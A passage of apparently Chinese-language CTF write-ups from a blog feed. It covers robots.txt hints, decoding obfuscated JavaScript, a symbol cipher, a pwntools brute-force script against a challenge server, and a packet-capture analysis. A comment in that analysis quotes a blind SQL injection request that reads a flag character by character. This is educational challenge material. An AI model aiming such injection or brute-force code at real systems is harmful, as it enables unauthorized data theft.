            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022Space Heroes CTF</title>
      <link href="/2023/08/29/CTFS/2022Space-Heroes-CTF/"/>
      <url>/2023/08/29/CTFS/2022Space-Heroes-CTF/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="R2D2"><a href="#R2D2" class="headerlink" title="R2D2"></a>R2D2</h5><p>提示robot机器人，直接访问robots.txt即可</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403204930418.png" alt="image-20220403204930418"></p><h3 id="Space-Traveler"><a href="#Space-Traveler" class="headerlink" title="Space Traveler"></a>Space Traveler</h3><p>前端验证，直接右键源代码，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0xb645=[&quot;\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E&quot;,&quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;,&quot;\x64\x65\x6D\x6F&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;];function myFunction()&#123;let _0xb729x2;let _0xb729x3=prompt(_0xb645[0],_0xb645[1]);switch(_0xb729x3)&#123;case _0xb645[3]:_0xb729x2= _0xb645[2];break;default:_0xb729x2= _0xb645[4]&#125;;document[_0xb645[7]](_0xb645[6])[_0xb645[5]]= _0xb729x2&#125;</span><br></pre></td></tr></table></figure><p>这里函数拼接  不用管，直接把所有的16进制提出来，解一下就出了.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C\x64\x65\x6D\x6F\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205401207.png" alt="image-20220403205401207"></p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h3 id="Khaaaaaan"><a href="#Khaaaaaan" class="headerlink" title="Khaaaaaan!"></a>Khaaaaaan!</h3><p>开局一张图，是四种图形编码</p><p>分别对应的是</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205525043.png" alt="image-20220403205525043"></p><blockquote><p><a href="https://www.dcode.fr/symbols-ciphers">https://www.dcode.fr/symbols-ciphers</a><br>shctf{without_freedom_of_choice_there_is_no_creativity}</p></blockquote><h3 id="MobileInfantry"><a href="#MobileInfantry" class="headerlink" title="MobileInfantry"></a>MobileInfantry</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># def len_check(pad):</span></span><br><span class="line"><span class="comment">#     if len(pad) != 38:</span></span><br><span class="line"><span class="comment">#         return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 38位，</span></span><br><span class="line"><span class="comment"># def check1(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)+1):</span></span><br><span class="line"><span class="comment">#         if not pad[i].isupper():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># isupper():大写，1-20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def check2(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)):</span></span><br><span class="line"><span class="comment">#         if not pad[i].islower():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># islower():小写，21-38</span></span><br><span class="line"><span class="comment"># def check3(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])-1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># 1-19  ABCDEFGHIJKLMNOPQRSTaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkjihgfedcba</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkji</span></span><br><span class="line"><span class="comment"># def check4(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)-1):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])+1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTzyxwvutsrqponmlkji</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">strqian = <span class="string">&quot;ABCDEFGHIJKLMNOPQRST&quot;</span></span><br><span class="line">strhou = <span class="string">&quot;zyxwvutsrqponmlkji&quot;</span></span><br><span class="line">listqian = []</span><br><span class="line">listhou = []</span><br><span class="line"><span class="comment">#循环出所有前缀listqian</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strqian:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listqian.append(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(listqian)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#循环出所有后缀listhou</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strhou:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listhou.append(s)</span><br><span class="line"><span class="comment">#print(listhou)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        sendstr = listqian[i]+listhou[j]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>,<span class="number">27602</span>)</span><br><span class="line">            io.sendline(sendstr)</span><br><span class="line">            a = io.recvall()</span><br><span class="line">            <span class="comment"># io.recvuntil(&quot;[+]&quot;,)</span></span><br><span class="line">            <span class="comment"># a = io.recvuntil(&quot;.&quot;,)</span></span><br><span class="line">            <span class="comment">#print(a.encode())</span></span><br><span class="line">            <span class="comment">#if &quot;&#123;&quot; in str(a) or &quot;&#125;&quot; in str(a):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(a):</span><br><span class="line">                <span class="built_in">print</span>(sendstr)</span><br><span class="line">                <span class="comment">#io.interactive()</span></span><br><span class="line">                <span class="built_in">print</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> 泷剑杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfweb刷题记录</title>
      <link href="/2023/06/14/ctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/06/14/ctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="鹤城杯-2021-流量分析"><a href="#鹤城杯-2021-流量分析" class="headerlink" title="[鹤城杯 2021]流量分析"></a>[鹤城杯 2021]流量分析</h4><p>开局拿到一个流量包，是流量分析，经典老题，</p><p>一个一个数显然太慢了，抄的脚本，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings timu.pcapng| grep flag &gt; a.txt</span></span><br><span class="line"><span class="comment">#在kali中，将带有flag的字符提出来</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tjctf\\a.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="comment">#读取a.txt</span></span><br><span class="line">st = f.read().decode(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#GET /ctf/Less-5/?id=1&#x27;%20and%20ascii(substr((select%20flag%20from%20t),1,1))=33--+ HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">lis = re.findall(<span class="string">&quot;,([0-9]*),1\)\)=([0-9]*)&quot;</span>,st)</span><br><span class="line"><span class="comment">#获取 位数和字符数</span></span><br><span class="line">aa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    <span class="comment">#将数字为1的索引一个个填充，正好到最后一个，换索引</span></span><br><span class="line">    aa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line">    <span class="comment">#print(aa)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">sss  = [(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;37&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;38&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;39&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;40&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;41&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;42&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;43&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;44&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;45&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;46&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;47&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;48&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;49&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;50&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;51&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;52&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;53&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;54&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;55&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;56&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;57&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;58&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;59&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;60&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;61&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;62&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;63&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;64&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;65&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;66&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;67&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;68&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;69&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;70&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;71&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;72&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;73&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;74&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;75&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;76&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;77&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;78&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;79&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;80&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;81&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;82&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;83&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;84&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;85&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;86&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;87&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;88&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;89&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;90&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;91&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;92&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;93&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;94&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;95&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;96&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;97&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;98&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;99&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;100&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;101&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;102&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;37&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;38&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;39&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;40&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;41&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;42&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;43&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;44&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;45&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;46&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;47&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;48&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;49&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;50&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;51&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;52&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;53&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;54&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;55&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;56&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;57&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;58&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;59&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;60&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;61&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;62&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;63&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;64&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;65&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;66&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;67&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;68&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;69&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;70&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;71&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;72&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;73&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;74&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;75&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;76&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;77&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;78&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;79&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;80&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;81&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;82&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;83&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;84&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;85&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;86&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;87&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;88&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;89&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;90&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;91&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;92&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;93&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;94&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;95&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;96&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;97&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;98&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;99&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;100&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;101&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;102&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;103&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;104&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;105&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;106&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;107&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;108&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), </span><br><span class="line"></span><br><span class="line">aaa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> sss:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    aaa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">print</span>(aaa)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#flag&#123;w1reshARK_ez_1sntit&#125;~~~~&lt;</span></span><br></pre></td></tr></table></figure><p>或者一部到位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tjctf\\timu.pcapng&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">st = f.read().decode(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">lis = re.findall(<span class="string">&quot;,([0-9]*),1\)\)=([0-9]*)&quot;</span>,st)</span><br><span class="line">aa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), 